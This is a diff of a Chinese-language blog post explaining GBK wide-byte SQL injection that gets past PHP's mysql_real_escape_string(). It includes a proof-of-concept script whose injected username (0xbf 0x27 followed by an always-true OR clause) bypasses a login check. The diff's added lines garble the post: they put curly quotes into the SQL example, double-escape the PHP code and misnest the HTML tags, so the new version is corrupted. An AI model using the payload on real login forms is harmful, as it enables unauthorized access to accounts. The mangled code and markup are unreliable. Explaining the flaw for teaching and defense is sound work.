@@ -154,34 +154,34 @@
 
 <p><span style="font-size: medium;">mysql_real_escape_string() 也存在相同的问题，只不过相比 addslashes() 它考虑到了用什么字符集来处理，因此可以用相应的字符集来处理字符。在MySQL 中有两种改变默认字符集的方法。</span></p>
 
-<pre><code class="bash">
+<p><pre><code class="bash">
 方法一：
 改变mysql配置文件my.cnf
 [client]
 default-character-set=GBK
 方法二：
 在建立连接时使用
-SET CHARACTER SET 'GBK'
-例：mysql_query("SET CHARACTER SET 'gbk'", $c);
-</code></pre>
+SET CHARACTER SET &lsquo;GBK&rsquo;
+例：mysql_query(&ldquo;SET CHARACTER SET &lsquo;gbk&rsquo;&rdquo;, $c);</p>
 
-<p><span style="font-size: medium;">问题是方法二在改变字符集时mysql_real_escape_string() 并不知道而使用默认字符集处理从而造成和 addslashes() 一样的漏洞</span></p>
+<pre><code>
+&lt;span style=&quot;font-size: medium;&quot;&gt;问题是方法二在改变字符集时mysql_real_escape_string() 并不知道而使用默认字符集处理从而造成和 addslashes() 一样的漏洞&lt;/span&gt;
 
-<pre><code class="php">
-&lt;?php
+&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;
+&amp;lt;?php
 
-$c = mysql_connect("localhost", "user", "pass");
-mysql_select_db("database", $c);
+$c = mysql_connect(&quot;localhost&quot;, &quot;user&quot;, &quot;pass&quot;);
+mysql_select_db(&quot;database&quot;, $c);
 
 // change our character set
-mysql_query("SET CHARACTER SET 'gbk'", $c);
+mysql_query(&quot;SET CHARACTER SET 'gbk'&quot;, $c);
 
 // create demo table
-mysql_query("CREATE TABLE users (
+mysql_query(&quot;CREATE TABLE users (
     username VARCHAR(32) PRIMARY KEY,
     password VARCHAR(32)
-) CHARACTER SET 'GBK'", $c);
-mysql_query("INSERT INTO users VALUES('foo','bar'), ('baz','test')", $c);
+) CHARACTER SET 'GBK'&quot;, $c);
+mysql_query(&quot;INSERT INTO users VALUES('foo','bar'), ('baz','test')&quot;, $c);
 
 // now the exploit code
 $_POST['username'] = chr(0xbf) . chr(0x27) . ' OR username = username #'; 
@@ -191,11 +191,11 @@ $_POST['password'] = 'anything';
 $user = mysql_real_escape_string($_POST['username'], $c);
 $passwd = mysql_real_escape_string($_POST['password'], $c);
 
-$sql = "SELECT * FROM  users WHERE  username = '{$user}' AND password = '{$passwd}'";
+$sql = &quot;SELECT * FROM  users WHERE  username = '{$user}' AND password = '{$passwd}'&quot;;
 $res = mysql_query($sql, $c);
 echo mysql_num_rows($res); // will print 2, indicating that we were able to fetch all records
 
-?&gt;
+?&amp;gt;
 </code></pre>
 
 <p><span style="font-size: medium;">环境PHP5.2</span><br />
